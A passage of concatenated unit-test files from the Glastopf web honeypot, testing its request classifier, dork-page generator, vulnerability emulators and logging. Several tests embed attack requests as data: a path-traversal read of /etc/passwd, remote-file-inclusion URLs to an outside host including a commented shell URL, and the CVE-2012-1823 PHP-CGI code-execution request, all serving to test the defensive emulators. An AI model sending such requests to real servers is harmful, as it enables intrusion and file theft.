            request = 'GET {0} HTTP/1.0'.format(path)
            http_handler = HTTPHandler(request, None)
            matched_pattern = self.requestClassifier.classify_request(http_handler)
            self.assertTrue(matched_pattern == 'phpinfo', '{0} did not match expected pattern'.format(matched_pattern))

if __name__ == '__main__':
    unittest.main()

########NEW FILE########
__FILENAME__ = test_dork_list
# Copyright (C) 2012  Lukas Rist
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

from random import choice
import unittest
import os
import shutil
import tempfile

from lxml.html.soupparser import fromstring
from glastopf.modules.HTTP.handler import HTTPHandler
from glastopf.testing import helpers
from glastopf.modules.handlers.emulators.dork_list.dork_page_generator import DorkPageGenerator
from glastopf.modules.handlers.emulators.dork_list.dork_file_processor import DorkFileProcessor
from glastopf.modules.handlers.emulators.dork_list import database_mongo
from glastopf.modules.handlers.emulators.dork_list import database_sqla
from glastopf.modules.events import attack
from glastopf.glastopf import GlastopfHoneypot
from sqlalchemy import create_engine


class TestEmulatorDorkList(unittest.TestCase):
    """Tests the honeypots vulnerable string selection.
    We first start with the integration test and continue with unit tests.
    The test script will connect to an mongodb instance on localhost, and populate
    with data a needed."""

    def setUp(self):
        self.workdir = tempfile.mkdtemp()
        self.datadir = os.path.join(self.workdir, 'data')
        GlastopfHoneypot.prepare_environment(self.workdir)

    def tearDown(self):
        shutil.rmtree(self.workdir)

    def dork_generator_chain(self, dbtype):
        """
        Helper method to constructs chain of objects to satify dependencies for the dork_generator.
        Returns an instance of dork_page_generator.
        """

        engine = None
        if dbtype == "sql":
            engine = create_engine('sqlite:///')
            #Create mock of empty main db
            helpers.populate_main_sql_testdatabase(engine)
            db = database_sqla.Database(engine)
        elif dbtype == "mongodb":
            conn_string = helpers.create_mongo_database(fill=True)
            db = database_mongo.Database(helpers.create_mongo_database)
        else:
            raise Exception("Unsupported database type: {0}".format(dbtype))
        reduced_dorks_file = os.path.join(os.path.split(os.path.abspath(__file__))[0], 'data/dorks_reduced.txt')
        file_processor = DorkFileProcessor(db, dorks_file=reduced_dorks_file)
        dork_generator = DorkPageGenerator(db, file_processor, self.datadir)
        return db, engine, dork_generator

    def test_db_select_sqlalchemy(self):
        """Objective: Select unique request paths from database.
        Input: Connection to main glastopf database with 500 entries and the pattern 'rfi'.
        Expected Results: 10 data entries in total.
        """

        (db, engine, dork_generator) = self.dork_generator_chain('sql')
        dork_generator.regular_generate_dork(0)
        print "Starting database SELECT test..."
        result = db.select_data("rfi")
        self.assertEqual(len(result), 10)

    def test_automated_extension(self):
        """Objective: Test if the dork database extends on new requests to the honeypot.
        Input: A test request with URL: http://localhost:8080/test.php?c=test
        Expected Results: An entry in the 'inurl' db table containing '/test.php'.
        Notes: The test adds the '/test.php' entry to the database."""
        attack_event = attack.AttackEvent()
        attack_event.matched_pattern = "internal_test"
        attack_event.http_request = HTTPHandler('GET /thiswillNeVeRHaPPend.php?c=test', None)
        print "Attack event prepared."
        (db, engine, dork_generator) = self.dork_generator_chain('sql')
        dork_generator.regular_generate_dork(0)
        dork_generator.collect_dork(attack_event)
        print "Done collecting the path from the event and writing to the database."
        sql = "SELECT * FROM inurl WHERE content = :x"
        result = engine.connect().execute(sql, x='/thiswillNeVeRHaPPend.php').fetchall()
        print "Done fetching the entries matching the request URL"
        self.assertTrue(len(result) > 0)
        print "Number of entries in the database matching our URL:",
        print len(result),
        print "which equates our expectation."

    def test_dork_page(self):
        """Objective: Tests if the attack surface generation works.
        Input: Data from the dork database.
        Expected Results: HTML pages ready to be served to the adversary.
        Notes: This test covers the generation of the HTML pages from the dork database. The page number is proportional to database entries."""

        print "Starting dork page test."

        (db, engine, dork_generator) = self.dork_generator_chain('sql')
        dork_generator.regular_generate_dork(0)
        print "Done creating dork pages."
        current_pages = dork_generator.get_current_pages()
        self.assertTrue(len(current_pages) > 0)
        print "Number of created HTML pages:",
        print len(current_pages),
        print "equates our expectation."

    def test_dork_page_content(self):
        """Objective: Testing the attack surfaces content.
        Input: An attack surface sample. The structure is defined in a template.
        Expected Results: The attack surface should be a HTML page containing text and links.
        Notes: We extract and count the elements in the HTML document."""

        dork_generator = self.dork_generator_chain('sql')[2]
        dork_generator.regular_generate_dork(0)
        sample_file = choice(dork_generator.get_current_pages())
        with open(sample_file, 'r') as sample_data:
            data = fromstring(sample_data)
        self.assertTrue(len(data.cssselect('a')) > 0)
        self.assertTrue(len(data.cssselect('title')) > 0)
        self.assertTrue(len(data.cssselect('form')) > 0)
        print "The content analysis of a random HTML page returned:"
        print len(data.cssselect('a')), 'links (<a href=""></a>)',
        print len(data.cssselect('title')), 'page title (<title />)',
        print len(data.cssselect('form')), 'form field (<form />)'
        print "which equates our expectation."

    def test_dork_page_regeneration(self):
        """Objective: Test if the dork pages get regenerated.
        Input: The list of previously generated dork pages.
        Expected Results: A new list of dork pages.
        Notes: A productive system generates new pages in a configurable interval."""

        (db, engine, dork_generator) = self.dork_generator_chain('sql')
        dork_generator.regular_generate_dork(0)
        old_list = dork_generator.get_current_pages()
        print "There are %s previously generated dork pages" % len(old_list),
        old_sample_file = choice(old_list)
        print "For example:", old_sample_file.rsplit('/', 1)[1]
        dork_generator.regular_generate_dork(0)
        print "Done generating new dork pages.",
        print "Old dork pages has been removed."
        new_list = dork_generator.get_current_pages()
        overlap = set(new_list).intersection(old_list)
        self.assertTrue(len(overlap) == 0)
        print "There are", len(overlap), "overlapping dork pages",
        print "which equates our expectation."


if __name__ == '__main__':
    unittest.main()

########NEW FILE########
__FILENAME__ = test_emulators
# Copyright (C) 2012  Lukas Rist
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import unittest
import hashlib
import uuid
import shutil
import os
import tempfile
import inspect
import helpers

from glastopf.modules.handlers.request_handler import RequestHandler
from glastopf.glastopf import GlastopfHoneypot
import glastopf.modules.events.attack as attack
from glastopf.modules.HTTP.handler import HTTPHandler


class TestEmulatorIntegration(unittest.TestCase):
    """Tests the honeypots request emulation modules.
    General approach is to load the module, pass a request if needed and
    compare the modules return value with an expectation"""

    def setUp(self):
        self.work_dir = tempfile.mkdtemp()
        GlastopfHoneypot.prepare_environment(self.work_dir)
        self.data_dir = os.path.join(self.work_dir, 'data/')
        package_directory = os.path.dirname(os.path.abspath(inspect.getfile(RequestHandler)))
        #original data as stored with new glatopf installations
        self.original_data_dir = os.path.join(package_directory, 'emulators/data/')

    def tearDown(self):
        if os.path.isdir(self.work_dir):
            shutil.rmtree(self.work_dir)

    def test_dummy_emulator(self):
        """Objective: Tests the dummy emulator added to prove extensibility.
        Input: http://localhost:8080/
        Expected Results: Returns a short message for verification.
        Notes: The dummy emulator fulfills minimal emulator requirements."""
        print "Starting Dummy emulator module test"
        event = attack.AttackEvent()
        event.http_request = HTTPHandler('', None)
        event.matched_pattern = "dummy"
        print "Loading module"
        request_handler = RequestHandler(self.data_dir)
        emulator = request_handler.get_handler(event.matched_pattern)
        print "Trying to handle an event with the dummy module"
        emulator.handle(event)
        self.assertEqual(event.http_request.get_response_body(), "dummy response")
        print "Return value: '" + event.http_request.get_response_body() + "'",
        print "equates our expectation."

    def test_lfi_emulator(self):
        """Objective: Local File Inclusion module testing.
        Input: http://localhost:8080/test.php?p=../../../../../etc/passwd
        Expected Result: The passwd file from the virtual file system.
        Notes:"""
        print "Starting local file inclusion test"
        event = attack.AttackEvent()
        event.matched_pattern = "lfi"
        event.http_request = HTTPHandler('', None)
        event.http_request.request_url = "/test.php?p=../../../../../etc/passwd"
        print "Sending request:", "http://localhost:8080" + event.http_request.request_url
        print "Loading the emulator and handling the request."
        request_handler = RequestHandler(self.data_dir)
        emulator = request_handler.get_handler(event.matched_pattern)
        emulator.handle(event)
        #TODO: Check it contains user names...
        response = event.http_request.get_response()
        self.assertIn('root:x:0:0:root:/root:/bin/bash', response)
        self.assertIn('daemon:x:1:1:daemon:/usr/sbin:/bin/sh', response)

    def test_pma_emulator(self):
        """Objective: Testing an emulator for PHPMyAdmin specific attacks.
        Input: http://localhost:8080/phpmyadmin
        Expected Result: The PHPMyAdmin set-up page.
        Notes: This module is for a specific attack against PHPMyAdmin"""
        with open(os.path.join(self.data_dir, 'phpmyadmin/script_setup.php'), 'r') as setup_php:
            page = setup_php.read()
            local_hash = hashlib.md5(page).hexdigest()
            print "Hash of the local 'script' file:", local_hash
        event = attack.AttackEvent()
        event.matched_pattern = "phpmyadmin"
        event.http_request = HTTPHandler('', None)
        request_handler = RequestHandler(self.data_dir)
        emulator = request_handler.get_handler(event.matched_pattern)
        print "Sending request:", "http://localhost:8080/phpmyadmin/setup.php"
        emulator.handle(event)
        remote_hash = hashlib.md5(emulator.page).hexdigest()
        self.assertEqual(remote_hash, local_hash)
        print "Return value:", remote_hash
        print "matched the hash of the local file."

    def test_rfi_emulator(self):
        # TODO: Handle return value from sandbox
        """Objective: Remote File Injection test.
        Input: http://localhost:8080/test.php?p=http://google.com/index.html
        Expected Result: The return value from the PHP sandbox.
        Notes: Injected file contains <?php echo("test successful"); ?>"""
        GlastopfHoneypot.prepare_sandbox(self.work_dir)
        print "Starting remote file inclusion test using unquoted url"
        event = attack.AttackEvent()
        event.http_request = HTTPHandler('GET /test.php?p=http://1durch0.de/test_file.txt HTTP/1.0', None)
        event.matched_pattern = "rfi"
        print "Sending request:", "http://localhost:8080" + event.http_request.path
        helpers.create_sandbox(self.data_dir)
        request_handler = RequestHandler(self.data_dir)
        emulator = request_handler.get_handler(event.matched_pattern)
        emulator.handle(event)
        self.assertEqual(event.http_request.get_response(), "test successful")
        print "Return value 'test successful', matching our expectation."

    def test_rfi_emulator_quoted_url(self):
        # TODO: Handle return value from sandbox
        """Objective: Remote File Injection test when attacker injects quoted url.
        Input: /test.php?p=http%3A%2F%21durch0.de%2Ftest_file.txt
        Expected Result: The return value from the PHP sandbox.
        Notes: Injected file contains <?php echo("test successful"); ?>"""
        GlastopfHoneypot.prepare_sandbox(self.work_dir)
        print "Starting remote file inclusion test using quoted url."
        event = attack.AttackEvent()
        event.http_request = HTTPHandler('GET /test.php?p=http%3A%2F%2F1durch0.de%2Ftest_file.txt HTTP/1.0', None)
        event.matched_pattern = "rfi"
        print "Sending request:", "http://localhost:8080" + event.http_request.path
        helpers.create_sandbox(self.data_dir)
        request_handler = RequestHandler(self.data_dir)
        emulator = request_handler.get_handler(event.matched_pattern)
        emulator.handle(event)
        self.assertEqual(event.http_request.get_response(), "test successful")
        print "Return value 'test successful', matching our expectation."

        #http%3A%2F%2Fflickr.com.blumenlendlefloral.com%2Fsh.php

    def test_rfi_emulator_with_malformed_uri(self):
        # TODO: Handle return value from sandbox
        """Objective: Remote File Injection test with malformed uri
        Input: http://localhost:8080/test.php?p="http://google.com/index.html
        Expected Result: The return value from the PHP sandbox.
        Notes: Injected file contains <?php echo("test successful"); ?>"""
        GlastopfHoneypot.prepare_sandbox(self.work_dir)
        print "Starting remote file inclusion test"
        event = attack.AttackEvent()
        event.http_request = HTTPHandler('GET /test.php?p=http://1durch0.de/test_file.txt HTTP/1.0', None)
        event.matched_pattern = "rfi"
        helpers.create_sandbox(self.data_dir)
        request_handler = RequestHandler(self.data_dir)
        emulator = request_handler.get_handler(event.matched_pattern)
        print "Sending request:", "http://localhost:8080" + event.http_request.path
        emulator.handle(event)
        self.assertEqual(event.http_request.get_response(), "test successful")
        print "Return value 'test successful', matching our expectation."

    def test_robots_emulator(self):
        """Objective: Test the robots.txt emulator.
        Input: http://localhost:8080/robots.txt
        Expected Response: The robots.txt page.
        Notes: The robots.txt is provided by the honeypot"""
        print "Starting robot.txt request handling module"
        with open(os.path.join(self.data_dir, 'robots/robots.txt'), 'r') as robots_file:
            robots = robots_file.read()
            local_hash = hashlib.md5(robots).hexdigest()
            print "Hash of the local 'robots' file:", local_hash
        event = attack.AttackEvent()
        event.http_request = HTTPHandler('GET /robots.txt HTTP/1.0', None)
        event.matched_pattern = "robots"
        request_handler = RequestHandler(self.data_dir)
        emulator = request_handler.get_handler(event.matched_pattern)
        print "Sending request:", "http://localhost:8080/robots.txt"
        emulator.handle(event)
        remote_hash = hashlib.md5(event.http_request.get_response()).hexdigest()
        self.assertEqual(remote_hash, local_hash)
        print "Return value:", remote_hash
        print "matched content of robots.txt."

    def test_style_css_emulator(self):
        """Objective: Test the style.css emulator.
        Input: http://localhost:8080/styles.css
        Expected Result: The styles.css file.
        Notes: Definitions used for the attacks surface style parameters."""
        print "Starting style.css emulator test"
        with open(os.path.join(self.data_dir, 'style/style.css'), 'r') as style_file:
            style = style_file.read()
            local_hash = hashlib.md5(style).hexdigest()
            print "Hash of the local 'style' file:", local_hash
        event = attack.AttackEvent()
        event.http_request = HTTPHandler('', None)
        event.matched_pattern = "style_css"
        request_handler = RequestHandler(self.data_dir)
        emulator = request_handler.get_handler(event.matched_pattern)
        print "Sending request:", "http://localhost:8080/style.css"
        emulator.handle(event)
        remote_hash = hashlib.md5(event.http_request.get_response_body()).hexdigest()
        self.assertEqual(remote_hash, local_hash)
        print "Return value:", remote_hash
        print "matched content of style.css."

    def test_unknown_emulator(self):
        """Objective: Emulator testing for non-malicious requests.
        Input: http://localhost:8080/
        Expected Result: One of the generated attack surfaces.
        Notes:"""

        tmp_file = os.path.join(self.data_dir, 'dork_pages', format(str(uuid.uuid4())))

        with open(tmp_file, 'w+') as f:
            f.write("tmpfile")
        print "Starting 'unknown' request emulation module"
        event = attack.AttackEvent()
        event.http_request = HTTPHandler('', None)
        event.matched_pattern = "unknown"
        event.http_request.path = "/"
        event.source_addr = ("127.0.0.1", "8080")
        request_handler = RequestHandler(self.data_dir)
        emulator = request_handler.get_handler(event.matched_pattern)
        print "Sending request:", "http://localhost:8080/"
        emulator.handle(event)
        remote_hash = hashlib.md5(event.http_request.get_response_body()).hexdigest()
        local_hash = hashlib.md5(emulator.template).hexdigest()
        print "Hash of the local 'response' file:", local_hash
        self.assertEqual(remote_hash, local_hash)
        print "Return value:", remote_hash
        print "matched a generated attack surface item."

    def test_phpcgi_source_code_disclosure_emulator(self):
        """Objective: Emulator testing for PHP CGI source code disclosure CVE-2012-1823
        Input: http://localhost:8080/index.php?-s
        Expected Result: Source code disclosure
        Notes:"""
        event = attack.AttackEvent()
        event.http_request = HTTPHandler('GET /index.php?-s HTTP/1.0', None)
        event.matched_pattern = "php_cgi_rce"
        request_handler = RequestHandler(self.data_dir)
        emulator = request_handler.get_handler(event.matched_pattern)
        emulator.handle(event)
        self.assertEquals(event.http_request.get_response(), """<code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br />page&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">$_GET</span><span style="color: #007700">[</span><span style="color: #DD0000">'page'</span><span style="color: #007700">];<br />include(</span><span style="color: #0000BB">page</span><span style="color: #007700">);<br /></span><span style="color: #0000BB">?&gt;<br /></span>
</span>""")

    def test_phpcgi_rce_emulator(self):
        """Objective: Emulator testing for PHP CGI remote code execution CVE-2012-1823
        Input: http://localhost/-d+allow_url_include=on+-d+safe_mode=off+-d+open_basedir=off-d+auto_prepend_file=php://input POST: <?php echo("rce attempt"); ?>
        Expected Result: Remote command execution of a echo command
        Notes:"""
        GlastopfHoneypot.prepare_sandbox(self.work_dir)
        os.mkdir(os.path.join(self.data_dir, 'files/'))
        request = "POST /index.php?-d+allow_url_include=on+-d+safe_mode=off+-d+open_basedir=off-d+auto_prepend_file=php://input HTTP/1.0\r\n\r\n" \
                  '<?php echo "testing"; ?>'
        event = attack.AttackEvent()
        event.http_request = HTTPHandler(request, None)
        event.matched_pattern = "php_cgi_rce"
        request_handler = RequestHandler(self.data_dir)
        emulator = request_handler.get_handler(event.matched_pattern)
        emulator.handle(event)
        print "Return value:", event.http_request.get_response()
        self.assertTrue("""testing""" == event.http_request.get_response())

    def test_phpinfo_emulator(self):
        """Objective: Emulator testing for phpinfo.php requests
        Input: http://localhost/phpinfo.php
        Expected Result: Result of the phpinfo() function
        Notes:"""
        event = attack.AttackEvent()
        event.http_request = HTTPHandler('GET /info.php?param1 HTTP/1.0', None)
        event.matched_pattern = "phpinfo"
        #self.event.http_request.method = 'GET'
        #self.event.http_request.url = "/info.php?param1"
        event.matched_pattern = "phpinfo"
        request_handler = RequestHandler(self.data_dir)
        emulator = request_handler.get_handler(event.matched_pattern)
        emulator.handle(event)
        self.assertTrue("PHP Version " in event.http_request.get_response())
        self.assertTrue("Zend Extension" in event.http_request.get_response())


if __name__ == '__main__':
    unittest.main()

########NEW FILE########
__FILENAME__ = test_honeypot
# Copyright (C) 2012  Lukas Rist
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import unittest
import tempfile
import shutil
import os

from glastopf.glastopf import GlastopfHoneypot
from glastopf.testing import helpers
from sqlalchemy import create_engine


class TestHoneypotFunctionality(unittest.TestCase):
    """Tests the basic honeypot functionality
    Test set-up instantiates the honeypot.
    The main Test sends a request and checks the response."""

    def setUp(self):
        self.tmpdir = tempfile.mkdtemp()

    def tearDown(self):
        if os.path.isdir(self.tmpdir):
            shutil.rmtree(self.tmpdir)

    def test_honeypot_mongo(self):
        """Objective: Testing overall Honeypot integration.
        Input: Loads the honeypot module with mongodb as main database.
        Expected Response: Honeypot responses with a non-empty HTTP response.
        Note: This test verifies the overall functionality."""

        conn_string = helpers.create_mongo_database(fill=True)
        config_file = tempfile.mkstemp()[1]

        with open(config_file, 'w') as f:
            f.writelines(helpers.gen_config(conn_string))

        try:
            raw_request = "GET /honeypot_test HTTP/1.1\r\nHost: honeypot\r\n\r\n"
            source_address = ["127.0.0.1", "12345"]
            sensor_address = ["1.2.3.4", "8080"]
            GlastopfHoneypot.prepare_environment(self.tmpdir)
            self.glastopf = GlastopfHoneypot(work_dir=self.tmpdir, config=config_file)
            self.glastopf.options["enabled"] = "False"
            print "Sending request: http://localhost:8080/"

            response = self.glastopf.handle_request(raw_request,
                                                    source_address,
                                                    sensor_address)
            self.assertIsNot(response, None)
        finally:
            helpers.delete_mongo_testdata(conn_string)
            if os.path.isfile(config_file):
                os.remove(config_file)

    def test_honeypot_sql(self):
        """Objective: Testing overall Honeypot integration.
        Input: Loads the honeypot module with mongodb as main database.
        Expected Response: Honeypot responses with a non-empty HTTP response.
        Note: This test verifies the overall functionality."""

        db_file = tempfile.mkstemp()[1]
        conn_string = "sqlite:///{0}".format(db_file)
        sql_engine = create_engine(conn_string)
        helpers.populate_main_sql_testdatabase(sql_engine)

        config_file = tempfile.mkstemp()[1]

        with open(config_file, 'w') as f:
            f.writelines(helpers.gen_config(conn_string))

        try:
            raw_request = "GET /honeypot_test HTTP/1.1\r\nHost: honeypot\r\n\r\n"
            source_address = ["127.0.0.1", "12345"]
            sensor_address = ["1.2.3.4", "8080"]
            GlastopfHoneypot.prepare_environment(self.tmpdir)
            self.glastopf = GlastopfHoneypot(work_dir=self.tmpdir, config=config_file)
            self.glastopf.options["enabled"] = "False"
            print "Sending request: http://localhost:8080/"
            response = self.glastopf.handle_request(raw_request,
                                                    source_address,
                                                    sensor_address)
            self.assertIsNot(response, None)
        finally:
            if os.path.isfile(config_file):
                os.remove(config_file)
            if os.path.isfile(db_file):
                os.remove(db_file)


if __name__ == '__main__':
    unittest.main()

########NEW FILE########
__FILENAME__ = test_hpfeeds
# Copyright (C) 2013 Johnny Vestergaard <jkv@unixcluster.dk>
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import unittest
import os
import tempfile
import shutil

import helpers
import glastopf.modules.events.attack as attack
from glastopf.modules.reporting.auxiliary.log_hpfeeds import HPFeedsLogger
from glastopf.modules.HTTP.handler import HTTPHandler


class Test_Loggers(unittest.TestCase):

    def setUp(self):
        self.tmpdir = tempfile.mkdtemp()
        self.files_dir = os.path.join(self.tmpdir, 'files')
        os.mkdir(self.files_dir)

    def tearDown(self):
        if os.path.isdir(self.tmpdir):
            shutil.rmtree(self.tmpdir)

    def test_hpfeeds_event(self):
        """Objective: Testing if a basic event can be transmitted using hpfriends."""

        config_file = tempfile.mkstemp()[1]
        with open(config_file, 'w') as f:
            f.writelines(helpers.gen_config(''))

        logger = HPFeedsLogger(self.tmpdir, config=config_file, reconnect=False)
        event = attack.AttackEvent()
        event.http_request = HTTPHandler('', None)
        event.raw_request = "GET /honeypot_test HTTP/1.1\r\nHost: honeypot\r\n\r\n"
        logger.insert(event)
        error_message = logger.hpc.wait(2)
        self.assertIsNone(error_message)

    def test_hpfeeds_event_with_file(self):
        """Objective: Testing if a event containing a file can be transmitted using hpfriends."""

        config_file = tempfile.mkstemp()[1]
        with open(config_file, 'w') as f:
            f.writelines(helpers.gen_config(''))

        #create dummy file
        file_name = 'dummy_file'
        with open(os.path.join(self.files_dir, file_name), 'w') as f:
            print self.files_dir
            f.write('test_test_test_test_test')

        logger = HPFeedsLogger(self.tmpdir, config=config_file, reconnect=False)
        event = attack.AttackEvent()
        event.http_request = HTTPHandler('', None)
        event.raw_request = "GET /honeypot_test HTTP/1.1\r\nHost: honeypot\r\n\r\n"
        event.file_name = file_name
        logger.insert(event)
        error_message = logger.hpc.wait(2)
        self.assertIsNone(error_message)


if __name__ == '__main__':
    unittest.main()

########NEW FILE########
__FILENAME__ = test_http_handler
import unittest

from glastopf.modules.HTTP.handler import HTTPHandler, HTTPError


class TestHTTPParsing(unittest.TestCase):
    """Tests the honeypots vulnerable string selection.
    We first start with the integration test and continue with unit tests"""

    def test_simple_get_request(self):
        """Test simple GET request"""
        http_handler = """GET /test HTTP/1.0\r\nUser-Agent: test\r\n\r\n"""
        http_parser = HTTPHandler(http_handler, None)
        self.assertTrue(http_parser.request_path == "/test")

    def test_get_request_with_encoded_space(self):
        """Test simple GET request with space url encoded in the request path"""
        request_with_spaces = """GET /pathwith%20spaces HTTP/1.0\r\nUser-Agent: test\r\n\r\n"""
        http_handler = HTTPHandler(request_with_spaces, None)
        self.assertTrue(http_handler.request_path == "/pathwith%20spaces")

    def test_get_request_with_space(self):
        """Test that a simple GET request with space in the request path fails"""
        request_with_spaces = """GET /path with spaces?param1=value1\r\nHTTP/1.0\r\nUser-Agent: test\r\n\r\n"""
        self.assertRaises(HTTPError, HTTPHandler, request_with_spaces, None)

    def test_parse_command(self):
        """ Test if the parser is able to extract the HTTP command (verb)"""
        get_request = """GET /test HTTP/1.0\r\nUser-Agent: test\r\n\r\n"""
        http_handler = HTTPHandler(get_request, None)
        self.assertTrue(http_handler.request_verb == "GET")

    def test_parse_version(self):
        """ Test if the parser is able to extract the HTTP version"""
        get_request = """GET /test HTTP/1.0\r\nUser-Agent: test\r\n\r\n"""
        http_handler = HTTPHandler(get_request, None)
        self.assertTrue(http_handler.request_version == "HTTP/1.0")

    def test_parse_version(self):
        """ Test if the http handler is able to customize the server version string. """
        get_request = """GET /test HTTP/1.0\r\nUser-Agent: test\r\n\r\n"""
        http_handler = HTTPHandler(get_request, None, server_version="LEET_Server/0.1", sys_version="LEET_OS/1.0")
        self.assertEqual("LEET_Server/0.1 LEET_OS/1.0", http_handler.version_string())


if __name__ == '__main__':
    unittest.main()

########NEW FILE########
__FILENAME__ = test_mnemosyne
# Copyright (C) 2013  Johnny Vestergaard
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import unittest

from glastopf.modules.handlers.emulators.dork_list import mnem_service


class TestMnemosyneService(unittest.TestCase):
    def test_extractions(self):
        """
        Basic test to check if we can extract dorks from the mnemosyne dorks service.
        """

        sut = mnem_service.Mnem_Service()
        dorks = sut.get_dorks(username='glastopf_test', password='glastopf_test', limit=10)
        self.assertTrue(len(dorks) > 0)

    def test_error_login(self):
        """
        Test if we fail soft on login errors.
        The  mnemosyne module is designed to return an empty list on errors.
        """

        #using wrong username/pass to simulate an error
        sut = mnem_service.Mnem_Service()
        dorks = sut.get_dorks(username='glastopf_test_invalid', password='glastopf_test_invalid')
        self.assertTrue(len(dorks) == 0)


if __name__ == '__main__':
    unittest.main()

########NEW FILE########
__FILENAME__ = test_reporting_main_mongo
# Copyright (C) 2013  Johnny Vestergaard
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import unittest
import warnings
from datetime import datetime

from glastopf.modules.reporting.main import log_mongodb
from pymongo import MongoClient, uri_parser
import glastopf.modules.events.attack as attack
from glastopf.modules.HTTP.handler import HTTPHandler
from glastopf.testing import helpers


class TestMongoMainDatbase(unittest.TestCase):
    def test_mongodb_insert(self):

        conn_string = helpers.create_mongo_database(fill=False)

        db_name = uri_parser.parse_uri(conn_string)["database"]

        try:
            maindb = log_mongodb.Database(conn_string)

            attack_event = attack.AttackEvent()
            attack_event.event_time = self.event_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            attack_event.matched_pattern = "test_test"
            attack_event.source_addr = ("192.168.1.201", 12345)
            request = ("GET /breadandbytter.php?a=b HTTP/1.0\r\n"
            "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n"
            "ISO-8859-1,utf-8;q=0.7,*;q=0.3r\n"
            "Connection: keep-alive\r\n\r\n"
            "some stuff")
            attack_event.http_request = HTTPHandler(request, None)

            maindb.insert(attack_event)

            with warnings.catch_warnings(record=True):
                collection = MongoClient(conn_string)[db_name]["events"]
            results = list(collection.find())

            #Check if database returned the correct amount
            self.assertEqual(len(list(results)), 1)

            entry = results[0]

            self.assertEqual(entry["source"][0], "192.168.1.201")
            self.assertEqual(entry["source"][1], 12345)
            self.assertEqual(entry["pattern"], "test_test")
            self.assertEqual(entry["request_raw"], request)
            self.assertEqual(entry["request_url"], "/breadandbytter.php?a=b")

        finally:
            helpers.delete_mongo_testdata(conn_string)


if __name__ == '__main__':
    unittest.main()

########NEW FILE########
__FILENAME__ = test_reporting_main_sqla
# Copyright (C) 2013  Johnny Vestergaard
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import unittest
from datetime import datetime

from glastopf.modules.reporting.main import log_sql
from sqlalchemy import create_engine

import glastopf.modules.events.attack as attack
from glastopf.modules.HTTP.handler import HTTPHandler


class TestSQLAlchemy(unittest.TestCase):
    def test_sqla_insert(self):
        #in-memory sqlite database
        sqla_engine = create_engine("sqlite:///")
        maindb = log_sql.Database(sqla_engine)

        #prepare attack event
        attack_event = attack.AttackEvent()
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        attack_event.event_time = timestamp
        attack_event.matched_pattern = "test_test"
        attack_event.source_addr = ("192.168.1.201", 12345)
        request = (
            'GET /breadandbytter.php?a=b HTTP/1.0\r\n'
            'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n'
            'ISO-8859-1,utf-8;q=0.7,*;q=0.3r\n'
            'Connection: keep-alive\r\n\r\n'
            'some stuff'
        )
